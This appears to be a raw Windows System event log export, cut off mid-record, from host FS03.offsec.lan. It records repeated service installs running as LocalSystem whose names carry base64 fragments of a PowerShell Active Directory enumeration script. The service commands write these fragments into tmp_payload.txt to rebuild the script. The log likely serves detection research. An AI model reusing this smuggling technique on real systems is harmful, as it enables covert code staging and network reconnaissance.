    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7000"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:17.946749+00:00"
                },
                "EventRecordID": "9932",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "2368"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "bGVjdGVkIGxpc3QgdHlwZQ0KDQojQHBhcmFtICRDb21wdXRlckxpc3RUeXBlICAgLT4gVGhlIHR5cGUgb2YgY29tcHV0ZXIgbGlzdCAgIA0KDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy"
                    },
                    {
                        "@Name": "param2",
                        "#text": "%%1053"
                    }
                ],
                "Binary": "cwBlAGcAMgAwADkAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "16384",
                    "#text": "7045"
                },
                "Version": "0",
                "Level": "4",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:19.033714+00:00"
                },
                "EventRecordID": "9933",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ServiceName",
                        "#text": "MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQpmdW5jdGlvbiBHZXQtQ29tcHV0ZXJMaXN0IHsgcGFyYW0oJENvbXB1dGVyTGlzdFR5"
                    },
                    {
                        "@Name": "ImagePath",
                        "#text": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg210\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
                    },
                    {
                        "@Name": "ServiceType",
                        "#text": "user mode service"
                    },
                    {
                        "@Name": "StartType",
                        "#text": "demand start"
                    },
                    {
                        "@Name": "AccountName",
                        "#text": "LocalSystem"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7009"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:19.408701+00:00"
                },
                "EventRecordID": "9934",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "30000"
                    },
                    {
                        "@Name": "param2",
                        "#text": "MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQpmdW5jdGlvbiBHZXQtQ29tcHV0ZXJMaXN0IHsgcGFyYW0oJENvbXB1dGVyTGlzdFR5"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADAAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7000"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:19.408701+00:00"
                },
                "EventRecordID": "9935",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KDQpmdW5jdGlvbiBHZXQtQ29tcHV0ZXJMaXN0IHsgcGFyYW0oJENvbXB1dGVyTGlzdFR5"
                    },
                    {
                        "@Name": "param2",
                        "#text": "%%1053"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADAAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "16384",
                    "#text": "7045"
                },
                "Version": "0",
                "Level": "4",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:20.486830+00:00"
                },
                "EventRecordID": "9936",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ServiceName",
                        "#text": "cGUpDQoNCg0KICAgIHRyeSB7DQoNCiAgICAgICAgJENvbXB1dGVyTGlzdCA9IEB7fTsNCg0KICAgICAgICBzd2l0Y2goJENvbXB1dGVyTGlzdFR5cGUpIHsNCg0KICAgICAgICAgICAgJERPTUFJTl"
                    },
                    {
                        "@Name": "ImagePath",
                        "#text": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg211\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
                    },
                    {
                        "@Name": "ServiceType",
                        "#text": "user mode service"
                    },
                    {
                        "@Name": "StartType",
                        "#text": "demand start"
                    },
                    {
                        "@Name": "AccountName",
                        "#text": "LocalSystem"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7009"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:21.018091+00:00"
                },
                "EventRecordID": "9937",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "30000"
                    },
                    {
                        "@Name": "param2",
                        "#text": "cGUpDQoNCg0KICAgIHRyeSB7DQoNCiAgICAgICAgJENvbXB1dGVyTGlzdCA9IEB7fTsNCg0KICAgICAgICBzd2l0Y2goJENvbXB1dGVyTGlzdFR5cGUpIHsNCg0KICAgICAgICAgICAgJERPTUFJTl"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADEAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7000"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:21.018091+00:00"
                },
                "EventRecordID": "9938",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "cGUpDQoNCg0KICAgIHRyeSB7DQoNCiAgICAgICAgJENvbXB1dGVyTGlzdCA9IEB7fTsNCg0KICAgICAgICBzd2l0Y2goJENvbXB1dGVyTGlzdFR5cGUpIHsNCg0KICAgICAgICAgICAgJERPTUFJTl"
                    },
                    {
                        "@Name": "param2",
                        "#text": "%%1053"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADEAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "16384",
                    "#text": "7045"
                },
                "Version": "0",
                "Level": "4",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:22.080589+00:00"
                },
                "EventRecordID": "9939",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ServiceName",
                        "#text": "9PUFQgew0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgJEdldEFEQ29tcHV0ZXJMaXN0ID0gR2V0LUFEQ29tcHV0ZXIgLUNyZWRlbnRpYWwgJEdsb2JhbDpDcmVkIC1GaWx0ZXIge2VuYWJs"
                    },
                    {
                        "@Name": "ImagePath",
                        "#text": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg212\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
                    },
                    {
                        "@Name": "ServiceType",
                        "#text": "user mode service"
                    },
                    {
                        "@Name": "StartType",
                        "#text": "demand start"
                    },
                    {
                        "@Name": "AccountName",
                        "#text": "LocalSystem"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7009"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:22.455585+00:00"
                },
                "EventRecordID": "9940",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "30000"
                    },
                    {
                        "@Name": "param2",
                        "#text": "9PUFQgew0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgJEdldEFEQ29tcHV0ZXJMaXN0ID0gR2V0LUFEQ29tcHV0ZXIgLUNyZWRlbnRpYWwgJEdsb2JhbDpDcmVkIC1GaWx0ZXIge2VuYWJs"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADIAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7000"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:22.455585+00:00"
                },
                "EventRecordID": "9941",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "9PUFQgew0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgJEdldEFEQ29tcHV0ZXJMaXN0ID0gR2V0LUFEQ29tcHV0ZXIgLUNyZWRlbnRpYWwgJEdsb2JhbDpDcmVkIC1GaWx0ZXIge2VuYWJs"
                    },
                    {
                        "@Name": "param2",
                        "#text": "%%1053"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADIAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "16384",
                    "#text": "7045"
                },
                "Version": "0",
                "Level": "4",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:23.533724+00:00"
                },
                "EventRecordID": "9942",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ServiceName",
                        "#text": "ZWQgLWVxICJ0cnVlIn0gLVByb3BlcnRpZXMgT3BlcmF0aW5nU3lzdGVtIHwgU2VsZWN0IEROU0hvc3RuYW1lLCBPcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIC"
                    },
                    {
                        "@Name": "ImagePath",
                        "#text": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg213\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
                    },
                    {
                        "@Name": "ServiceType",
                        "#text": "user mode service"
                    },
                    {
                        "@Name": "StartType",
                        "#text": "demand start"
                    },
                    {
                        "@Name": "AccountName",
                        "#text": "LocalSystem"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7009"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:23.908709+00:00"
                },
                "EventRecordID": "9943",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "30000"
                    },
                    {
                        "@Name": "param2",
                        "#text": "ZWQgLWVxICJ0cnVlIn0gLVByb3BlcnRpZXMgT3BlcmF0aW5nU3lzdGVtIHwgU2VsZWN0IEROU0hvc3RuYW1lLCBPcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIC"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADMAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7000"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:23.908709+00:00"
                },
                "EventRecordID": "9944",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "ZWQgLWVxICJ0cnVlIn0gLVByb3BlcnRpZXMgT3BlcmF0aW5nU3lzdGVtIHwgU2VsZWN0IEROU0hvc3RuYW1lLCBPcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIC"
                    },
                    {
                        "@Name": "param2",
                        "#text": "%%1053"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADMAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "16384",
                    "#text": "7045"
                },
                "Version": "0",
                "Level": "4",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:24.976231+00:00"
                },
                "EventRecordID": "9945",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ServiceName",
                        "#text": "AgICAkQ29tcHV0ZXJMaXN0ID0gJEdldEFEQ29tcHV0ZXJMaXN0LkROU0hvc3ROYW1lDQoNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgfSANCiAg"
                    },
                    {
                        "@Name": "ImagePath",
                        "#text": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg214\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
                    },
                    {
                        "@Name": "ServiceType",
                        "#text": "user mode service"
                    },
                    {
                        "@Name": "StartType",
                        "#text": "demand start"
                    },
                    {
                        "@Name": "AccountName",
                        "#text": "LocalSystem"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7009"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:25.351221+00:00"
                },
                "EventRecordID": "9946",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "30000"
                    },
                    {
                        "@Name": "param2",
                        "#text": "AgICAkQ29tcHV0ZXJMaXN0ID0gJEdldEFEQ29tcHV0ZXJMaXN0LkROU0hvc3ROYW1lDQoNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgfSANCiAg"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADQAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7000"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:25.351221+00:00"
                },
                "EventRecordID": "9947",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "AgICAkQ29tcHV0ZXJMaXN0ID0gJEdldEFEQ29tcHV0ZXJMaXN0LkROU0hvc3ROYW1lDQoNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgfSANCiAg"
                    },
                    {
                        "@Name": "param2",
                        "#text": "%%1053"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADQAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "16384",
                    "#text": "7045"
                },
                "Version": "0",
                "Level": "4",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:26.423653+00:00"
                },
                "EventRecordID": "9948",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ServiceName",
                        "#text": "ICAgICAgIA0KICAgICAgICAgICAgJEZJTEVfT1BUIHsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJMaXN0ID0gR2V0LUZpbGVOYW1lICJEZXNrdG9wIiANCiAgIC"
                    },
                    {
                        "@Name": "ImagePath",
                        "#text": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg215\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
                    },
                    {
                        "@Name": "ServiceType",
                        "#text": "user mode service"
                    },
                    {
                        "@Name": "StartType",
                        "#text": "demand start"
                    },
                    {
                        "@Name": "AccountName",
                        "#text": "LocalSystem"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7009"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:26.798624+00:00"
                },
                "EventRecordID": "9949",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "30000"
                    },
                    {
                        "@Name": "param2",
                        "#text": "ICAgICAgIA0KICAgICAgICAgICAgJEZJTEVfT1BUIHsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJMaXN0ID0gR2V0LUZpbGVOYW1lICJEZXNrdG9wIiANCiAgIC"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADUAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7000"
                },
                "Version": "0",
                "Level": "2",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:26.798624+00:00"
                },
                "EventRecordID": "9950",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": ""
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "param1",
                        "#text": "ICAgICAgIA0KICAgICAgICAgICAgJEZJTEVfT1BUIHsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXJMaXN0ID0gR2V0LUZpbGVOYW1lICJEZXNrdG9wIiANCiAgIC"
                    },
                    {
                        "@Name": "param2",
                        "#text": "%%1053"
                    }
                ],
                "Binary": "cwBlAGcAMgAxADUAAAA="
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "16384",
                    "#text": "7045"
                },
                "Version": "0",
                "Level": "4",
                "Task": "0",
                "Opcode": "0",
                "Keywords": "0x8080000000000000",
                "TimeCreated": {
                    "@SystemTime": "2021-11-03 08:20:27.868324+00:00"
                },
                "EventRecordID": "9951",
                "Correlation": {
                    "@ActivityID": "",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "484",
                    "@ThreadID": "3168"
                },
                "Channel": "System",
                "Computer": "FS03.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ServiceName",
                        "#text": "AgICAgICAgICAgICAkQ29tcHV0ZXJMaXN0ID0gR2V0LUNvbnRlbnQgJENvbXB1dGVyTGlzdA0KDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJExP"
                    },
                    {
                        "@Name": "ImagePath",
                        "#text": "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service \"seg216\" | select -Expand DisplayName |out-file -append tmp_payload.txt\""
                    },
                    {
                        "@Name": "ServiceType",
                        "#text": "user mode service"
                    },
                    {
                        "@Name": "StartType",
                        "#text": "demand start"
                    },
                    {
                        "@Name": "AccountName",
                        "#text": "LocalSystem"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Service Control Manager",
                    "@Guid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}",
                    "@EventSourceName": "Service Control Manager"
                },
                "EventID": {
                    "@Qualifiers": "49152",
                    "#text": "7009"
                },
                "Version": "0",
